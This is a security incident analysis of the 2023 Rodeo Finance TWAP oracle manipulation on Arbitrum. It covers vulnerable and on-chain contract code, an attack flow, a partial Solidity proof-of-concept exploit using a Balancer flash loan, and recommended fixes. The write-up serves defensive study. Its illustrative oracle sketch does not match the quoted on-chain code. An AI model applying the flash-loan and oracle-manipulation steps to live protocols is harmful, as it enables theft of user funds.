# Rodeo Finance TWAP Oracle Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Rodeo Finance |
| Date | 2023-07-21 |
| Chain | Arbitrum |
| Loss | ~$888,000 USD (~472 ETH) |
| Attack Type | Multi-block TWAP Oracle Manipulation |
| CWE | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| Attacker Address | `0x2f3788f2396127061c46fc07bd0fcb91faace328` |
| Attack Contract | `0xe9544ee39821f72c4fc87a5588522230e340aa54` |
| Vulnerable Contract | `0xf3721d8a2c051643e06bf2646762522fa66100da` |
| Fork Block | 110,043,452 |

## 2. Vulnerability Code Analysis

Rodeo Finance's Investor contract calculated the unshETH price using a TWAP oracle, but the TWAP could be manipulated via a multi-block sandwich attack. The attacker spread transactions across multiple blocks to artificially inflate the TWAP price.

```solidity
// Vulnerable pattern: short-period TWAP (manipulable via multi-block)
contract Investor {
    IUniswapV3Pool public pool;  // unshETH/WETH pool
    uint32 public twapPeriod = 300;  // 5-minute TWAP (vulnerable: too short)

    function getUnshETHPrice() public view returns (uint256) {
        (int24 arithmeticMeanTick,) = OracleLibrary.consult(address(pool), twapPeriod);
        uint256 price = OracleLibrary.getQuoteAtTick(
            arithmeticMeanTick,
            1e18,
            address(unshETH),
            address(WETH)
        );
        return price;
    }

    function earn(uint256 usdcAmount) external {
        // Vulnerable: uses price calculated from 5-minute TWAP
        uint256 unshETHPrice = getUnshETHPrice();  // manipulated price
        uint256 unshETHAmount = usdcAmount * 1e18 / unshETHPrice;

        // Opens an oversized unshETH position
        _openPosition(unshETHAmount);
    }
}
```

**Vulnerability**: A 5-minute (300-second) TWAP can be manipulated via multi-block transactions. The attacker spread trades across multiple blocks to sustain the inflated price throughout the TWAP window.

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: OracleTWAP.sol
contract OracleTWAP {  // ❌
    error Unauthorized();

    IOracle public oracle;
    int256[4] public prices;
    uint256 public lastIndex;
    uint256 public lastTimestamp;
    uint256 public constant updateInterval = 30 minutes;
    mapping(address => bool) public exec;

    event Updated(int256 price);
    event FileAddress(bytes32 indexed what, address data);

    constructor(address _oracle) {
        oracle = IOracle(_oracle);
        int256 price = currentPrice();
        prices = [price, price, price, price];
        lastTimestamp = block.timestamp;
        exec[msg.sender] = true;
    }

    modifier auth() {
        if (!exec[msg.sender]) revert Unauthorized();
        _;
    }

    function file(bytes32 what, address data) external auth {
        if (what == "exec") exec[data] = !exec[data];
        emit FileAddress(what, data);
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function latestAnswer() external view returns (int256) {
        require(block.timestamp < lastTimestamp + (updateInterval * 2), "stale price");
        int256 price = (prices[0] + prices[1] + prices[2] + prices[3]) / 4;
        return price;
    }

    function update() external auth {
        require(block.timestamp > lastTimestamp + updateInterval, "before next update");
        lastIndex = (lastIndex + 1) % 4;
        prices[lastIndex] = currentPrice();
        lastTimestamp = block.timestamp;
        emit Updated(prices[lastIndex]);
    }

    function currentPrice() public view returns (int256) {
        return oracle.latestAnswer() * 1e18 / int256(10 ** oracle.decimals());
    }
}
```

## 3. Attack Flow

```
Attacker [0x2f3788f2396127061c46fc07bd0fcb91faace328]
  │
  ├─1─▶ Preparation: multi-block price manipulation (spread across multiple blocks)
  │      Bulk-buy unshETH via CamelotRouter
  │      [CamelotRouter: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d]
  │      TWAP price gradually inflated
  │
  ├─2─▶ TWAP manipulation complete (after 5 minutes)
  │
  ├─3─▶ BalancerVault.flashLoan() [0xBA12222222228d8Ba445958a75a0704d566BF2C8]
  │      Borrow 30 WETH
  │
  ├─4─▶ swapTokens() → swapUSDCToWETH()
  │      [UniswapV3: 0xE592427A0AEce92De3Edee1F18E0157C05861564]
  │      Borrow 400,000 USDC and convert to WETH
  │
  ├─5─▶ Investor.earn(400,000 USDC)
  │      [USDC Pool: 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE]
  │      Open unshETH position at inflated TWAP price
  │      [unshETH: 0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef]
  │
  ├─6─▶ Immediately close position (at fair market price)
  │      Profit realized: manipulated price − actual price = ~472 ETH
  │
  └─7─▶ Repay Balancer flash loan + collect profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IInvestor {
    function earn(address token, uint256 amount, address strategy, uint256 slippage, bytes calldata data) external returns (uint256);
}

contract RodeoExploit {
    IInvestor investor = IInvestor(0x8accf43Dd31DfCd4919cc7d65912A475BfA60369);
    ICamelotRouter camelot = ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ISwapRouter uniV3 = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 unshETH = IERC20(0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef);

    function testExploit() external {
        // Pre-condition: TWAP manipulation via multi-block already complete
        swapTokens();

        // Balancer flash loan
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 30e18;
        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(address[] memory, uint256[] memory amounts, ...) external {
        swapUSDCToWETH();
        // Execute earn() at inflated TWAP price
        USDC.approve(address(investor), 400_000e6);
        investor.earn(address(USDC), 400_000e6, address(unshETH), 0, "");
        // Immediately close position
        // ...
        WETH.transfer(address(balancer), amounts[0]);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| Vulnerability Type | Multi-block TWAP manipulation, oracle design flaw |
| Impact Scope | Rodeo Finance unshETH strategy pool |
| Explorer | [Arbiscan](https://arbiscan.io/address/0xf3721d8a2c051643e06bf2646762522fa66100da) |

## 6. Security Recommendations

```solidity
// Fix 1: Significantly extend the TWAP period (minimum 30 minutes)
uint32 public constant MIN_TWAP_PERIOD = 1800;  // 30 minutes

function getUnshETHPrice() public view returns (uint256) {
    require(twapPeriod >= MIN_TWAP_PERIOD, "TWAP period too short");
    (int24 arithmeticMeanTick,) = OracleLibrary.consult(address(pool), twapPeriod);
    // ...
}

// Fix 2: Dual oracle — Chainlink + TWAP
function getUnshETHPrice() public view returns (uint256) {
    uint256 chainlinkPrice = getChainlinkPrice();
    uint256 twapPrice = getTWAPPrice();

    // Revert if the two prices deviate by more than 5%
    uint256 deviation = chainlinkPrice > twapPrice
        ? (chainlinkPrice - twapPrice) * 10000 / chainlinkPrice
        : (twapPrice - chainlinkPrice) * 10000 / twapPrice;
    require(deviation <= 500, "Price deviation too high");

    return (chainlinkPrice + twapPrice) / 2;
}

// Fix 3: Enforce a minimum holding period after position entry
mapping(address => uint256) public positionOpenTime;

function closePosition(uint256 positionId) external {
    require(block.timestamp >= positionOpenTime[positionId] + 1 hours, "Must hold for 1 hour");
    // ...
}
```

## 7. Lessons Learned

1. **TWAP Period Design**: A 5-minute TWAP is vulnerable to multi-block attacks. DeFi oracle TWAP periods should be at least 30 minutes; low-liquidity tokens require even longer windows.
2. **Multi-block Manipulation**: Spreading transactions across multiple blocks — not just a single block — is sufficient to manipulate TWAP. Oracle designs must account for this threat.
3. **Low-Liquidity Token Oracles**: Using tokens with low liquidity such as unshETH as collateral requires a particularly robust oracle.
4. **MEV on Arbitrum**: Arbitrum's sequencer architecture simplifies multi-block attacks. Oracle security on L2 chains can be more fragile than on L1.